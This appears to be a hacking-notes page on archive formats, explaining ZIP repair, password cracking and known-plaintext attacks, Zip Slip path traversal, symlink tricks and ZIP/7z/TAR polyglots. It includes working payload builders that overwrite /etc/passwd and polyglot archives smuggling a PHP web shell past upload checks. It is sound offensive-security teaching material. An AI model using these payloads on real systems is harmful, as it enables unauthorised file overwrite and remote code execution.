---
description: Different kinds of file archives, like ZIP, RAR or TAR
---

# Archives

## File format

<figure><img src="../.gitbook/assets/image (27).png" alt=""><figcaption><p>A visual explanation of the ZIP file format by Ange Albertini</p></figcaption></figure>

Sometimes a zip file can be corrupted, either intentionally or unintentionally. You can try to fix it using the `-FF` flag in `zip`:

```shell-session
$ zip -FF archive.zip --out fixed.zip
```

Sometimes `binwalk` can also help with finding files in the ZIP when `unzip` cannot. You may find compressed files. Specifically for [DEFLATE](https://en.wikipedia.org/wiki/Deflate), the following tool can help visualize how data is encoded and could help find more hidden facts about it:

{% embed url="https://lynn.github.io/flateview/" %}

When you suspect some kind of file trickery you should look at the file format, and find things that are unique about this ZIP file.

## Password Protection

Most types of archive files can set a password that encrypts the content until the correct password is given. There are a few tricks to brute-force or even bypass this password protection.&#x20;

### Brute-forcing

I spent a lot of time automating the cracking of password-protected archives in my [default](https://github.com/JorianWoltjer/default) tool:

```shell-session
$ default crack archive.zip
```

It will automatically recognize the type of encryption used and start hashcat or john to crack it using a wordlist.&#x20;

Doing it manually would require you to first get a hash using a tool like `zip2john` included in John the Ripper. Then you crack that hash with hashcat or john if you have the right hash mode.&#x20;

### Read filenames

An interesting little thing about most archive file formats is the fact that when they are encrypted, you can still read the filenames and structure, only the content is encrypted. This can already give a good idea of what kind of files the archive contains.&#x20;

<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ unzip -v archive.zip
</strong>Archive:  archive.zip
 Length   Method    Size  Cmpr    Date    Time   CRC-32   Name
--------  ------  ------- ---- ---------- ----- --------  ----
      15  Stored       15   0% 1970-01-01 00:00 21c0cb62  file.txt
--------          -------  ---                            -------
      15               15   0%                            1 file
</code></pre>

As you can see, even the size and a CRC32 are present. This CRC is a checksum of the **unencrypted** file content, so if you can guess the content you can confirm it by taking the CRC. This allows for brute-forcing content of very small files as well. See this tool for an implementation of that:

{% embed url="https://github.com/kmyk/zip-crc-cracker" %}
A Python tool to bruteforce content of very small files in an encrypted ZIP archive
{% endembed %}

### ZIP Known Plaintext Attack

The PKZIP stream cipher is vulnerable to a Known Plaintext attack. This means that if we **know some content** of a file in the encrypted ZIP, we can use it to find the keys used to decrypt the rest.&#x20;

With a faster brute-force attack afterward it is also possible to recover the original password for further use.&#x20;

The [bkcrack](https://github.com/kimci86/bkcrack) tool has a great implementation of this attack, see the tutorial here on how to use it:

{% embed url="https://github.com/kimci86/bkcrack/blob/master/example/tutorial.md" %}
A tool that uses the known plaintext attack to decrypt ZIP files and recover the password
{% endembed %}

## Zip Slip Vulnerability

When creating your own archives that some **target processes**, you can include malicious filenames like `../../../../etc/passwd` to **overwrite**/**create** local files in outside directories. This functionality can exist if an application has an import functionality or automatically extracts archives you upload.&#x20;

{% hint style="success" %}
While the most common format is ZIP, this vulnerability exists in many more archive types. Like `.tar`, `.jar`, `.war`, `.cpio`, `.apk`, `.rar` or `.7z`
{% endhint %}

Filenames in zip files can be folders because a ZIP file may contain folders, but the unexpected functionality is that they may even be `../` filenames, there is no limit. Most popular archive extract functions (from libraries) are safe from this by explicitly normalizing or forbidding these paths, but custom implementations could very well be vulnerable:

<pre class="language-java" data-title="Java"><code class="lang-java">Enumeration&#x3C;ZipEntry> entries = zip.getEntries();
<strong>while (entries.hasMoreElements()) { 
</strong>    ZipEntry e = entries.nextElement(); 
<strong>    File f = new File(destinationDir, e.getName()); 
</strong>    InputStream input = zip.getInputStream(e); 6 IOUtils.copy(input, write(f)); 
}
</code></pre>

The main _pattern_ to look out for is:

1. Looping through the elements
2. Concatenating the target directory with the filename directly

To test for and exploit such a vulnerability, simply create a file entry with a custom name:

<pre class="language-python" data-title="Python (ZIP)"><code class="lang-python">import zipfile  # ZIP

with zipfile.ZipFile("payload.zip", "w") as zip:
    #          source            name
<strong>    zip.write("passwd", "../../../../etc/passwd")
</strong></code></pre>

<pre class="language-python" data-title="Python (TAR)"><code class="lang-python">import tarfile

with tarfile.TarFile("zipslip.tar", "w") as tar:
<strong>    tar.add("passwd", "../../../../etc/passwd")
</strong></code></pre>

The above example will create a ZIP file `payload.zip`, that when extracted by vulnerable, will try to overwrite `/etc/passwd` with the content you choose. This can be useful if `root` executes it for a Privilege Escalation scenario, but more commonly you'll want to get initial access by **overwriting executable files** like PHP shells, templates, dotfiles, or `~/.ssh/authorized_keys` if SSH is enabled (see [arbitrary-file-write.md](../web/server-side/arbitrary-file-write.md "mention") for more details).

### Symlinks

Aside from directory traversal in filenames like shown above, most formats can even include **symbolic links** that point to another path. When extracted, most libraries or commands will correctly recognize and create symlinks while extracting, but these special files can have weird side effects.&#x20;

Processes afterward might read/write to this file but accidentally **follow the symlink** we created while doing so. This can result in arbitrary file read/write with multiple steps.&#x20;

{% hint style="info" %}
**Tip**: You can even include _multiple_ file entries with _the same name_, allowing for even more complex attacks. [See here](https://packetstormsecurity.com/files/24031/tar-symlink.txt.html) for an example that writes a symlink, and then overwrites its contents from within the same TAR file
{% endhint %}

#### ZIP

When using `zip` to include a symlink you made, it will by default **follow the symlink** and include the content of the file it is pointing to. This may be useful for [linux-privilege-escalation](../linux/linux-privilege-escalation/ "mention") when an application zips a symlink you make locally, but in a scenario where it only _extracts_ the file, you should keep the symlink intact inside the ZIP file using the `--symlinks` option:

<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ ln -s /etc/passwd link        # Create symlink locally
</strong><strong>$ zip --symlinks payload.zip *  # Add to new archive
</strong>$ unzip -p link.zip link        # View to confirm symlink was added
/etc/passwd
$ 7z l -ba -slt link.zip        # type=l meaning symlink
...
Attributes = _ lrwxrwxrwx
</code></pre>

#### TAR

By default, the `tar` command will allow storing and extracting symlinks:

<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ ln -s /etc/passwd link  # Create symlink locally
</strong><strong>$ tar -cvf payload.tar *  # Add to new archive
</strong>$ tar -tvf payload.tar    # View to confirm symlink was added
lrwxrwxrwx user/user     0 2023-00-00 00:00 link -> /etc/passwd
</code></pre>

## Polyglots

A "polyglot" is defined in English as a person who speaks multiple languages. When talking about file formats, this means a _file that can be interpreted in multiple ways_. These are useful for various reasons, mainly confusing parsers. A check might use one parser, but when using the file it will be parsed differently bypassing the check.&#x20;

Archive files have a few interesting properties of flexibility that make it fairly straightforward to create one file that extracts in two different ways depending on the tool used to inspect/extract it.&#x20;

To understand why tricks work and to **come up with your own**, look at the [@corkami/pics](https://github.com/corkami/pics/tree/master/binary) repository which has simple but useful images for many file formats, including archives.&#x20;

### ZIP file extracting as 7z

When some code tries to validate a ZIP file before extracting it, there is a high chance you can confuse it somehow to have the _check_ parse it differently than the _extraction_. One such example is using [ZIP](https://github.com/corkami/pics/blob/master/binary/ZIP.png) files combined with [7z](https://github.com/corkami/pics/blob/master/binary/7zip.png). This is possible because **a ZIP file is parsed from the end**, while a .7z file is parsed from the start recognized by its magic bytes!

A useful tool that can help us with this is [`truepolyglot`](https://github.com/ansemjo/truepolyglot) which has a `zipany` mode that can prefix a ZIP file with any content, and fix the offsets so it unzips without any errors. When we prefix a regular ZIP file with a 7z file, it will result in a special polyglot file that is a valid ZIP with some content, but `7z x` extracts it with the .7z's content. This confusion may bypass some checks.

<pre class="language-shell-session"><code class="lang-shell-session">$ echo dummy > file.txt
<strong>$ zip file.zip file.txt  # Prepare ZIP (carrier)
</strong>
$ echo '&#x3C;?php system($_GET["cmd"]) ?>' > shell.php
<strong>$ 7z a shell.7z shell.php  # Prepare 7z (payload)
</strong>
# # Combine into polyglot file
<strong>$ truepolyglot zipany --payload1file shell.7z --zipfile file.zip polyglot.zip
</strong></code></pre>

This created a `polyglot.zip` file which has the properties described above, confusing ZIP parsers thinking it is an innocent file, but has different contents when extracting using `7z x`:

<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ unzip -l polyglot.zip  # Shows only file.txt
</strong>  Length      Date    Time    Name
---------  ---------- -----   ----
        8  2023-10-18 20:52   file.txt
---------                     -------
        8                     1 file
<strong>$ 7z x polyglot.zip  # Only warnings, no errors
</strong>
WARNINGS:
There are data after the end of archive

WARNING:
polyglot.zip
Can not open the file as [zip] archive
The file is open as [7z] archive
...

Everything is Ok

Warnings: 1
Size:       30
Compressed: 328
<strong>$ ls -l  # Writes shell.php instead
</strong>-rw-r--r-- 1 j0r1an j0r1an 10414 Oct 18 21:04 polyglot.zip
-rw-r--r-- 1 j0r1an j0r1an    15 Oct 18 21:00 shell.php
</code></pre>

### ZIP magic bytes as TAR

In the previous trick, we learned that [ZIP](https://github.com/corkami/pics/blob/master/binary/ZIP.png) gets parsed from the end of the file. This can bypass most parsers and doesn't require the _first_ bytes to be the magic bytes in the file. In specific cases, however, this might not be enough, and you do need control over the start of the file to set the ZIP magic bytes for example. Then the trick above wouldn't work because the .7z format has its own.

To solve this, [TAR ](https://github.com/corkami/pics/blob/master/binary/TAR.png)can be used which does not require magic bytes at the start of the file like ZIP. When you try to create a raw `.tar` file using `tar -cf`, you may notice that it immediately starts with the filename you added:

<pre class="language-shell-session"><code class="lang-shell-session">$ touch ABCDEFGH
<strong>$ tar -cf test.tar ABCDEFGH
</strong><strong>$ hd test.tar 
</strong>00000000  41 42 43 44 45 46 47 48  00 00 00 00 00 00 00 00  |ABCDEFGH........|
00000010  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
...
</code></pre>

This can be abused to overwrite this filename with the ZIP magic bytes, which will happily be parsed as a filename. By overwriting these bytes, we bypass the magic bytes at the start of the file, and during extraction, the rest of the files in the TAR will be extracted.&#x20;

<pre class="language-shell-session"><code class="lang-shell-session">$ echo 'dummy' > file.txt
$ zip file.zip file.txt  # Prepare ZIP (carrier)

$ echo '&#x3C;?php system($_GET["cmd"]) ?>' > shell.php
$ touch $'PK\x03\x04'
<strong>$ tar -cf shell.tar $'PK\x03\x04' shell.php  # Prepare TAR (payload)
</strong>
# # Combine into polyglot file
<strong>$ truepolyglot zipany --payload1file shell.tar --zipfile file.zip polyglot.zip
</strong></code></pre>

The `shell.tar` file will have the correct magic bytes already, which are kept after the `truepolyglot` in the final `polyglot.zip` file. This will have ZIP magic bytes, be a valid parsable ZIP file, and at the same time be recognized as TAR by `7z`. See the following demo:

<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ head -c 4 polyglot.zip | hd  # Correct magic bytes
</strong>00000000  50 4b 03 04           |PK..|
00000004
<strong>$ unzip -l polyglot.zip  # Shows only file.txt
</strong>  Length      Date    Time    Name
---------  ---------- -----   ----
        8  2023-10-18 20:52   file.txt
---------                     -------
        8                     1 file
<strong>$ 7z x polyglot.zip  # Only warnings, no errors
</strong>
WARNINGS:
There are data after the end of archive

WARNING:
polyglot.zip
Can not open the file as [zip] archive
The file is open as [tar] archive
...
Everything is Ok

Warnings: 1
Size:       15
Compressed: 10414
<strong>$ ls -l  # Writes shell.php instead
</strong>-rw-r--r-- 1 j0r1an j0r1an 10414 Oct 18 21:04 polyglot.zip
-rw-r--r-- 1 j0r1an j0r1an    15 Oct 18 21:00 shell.php
</code></pre>
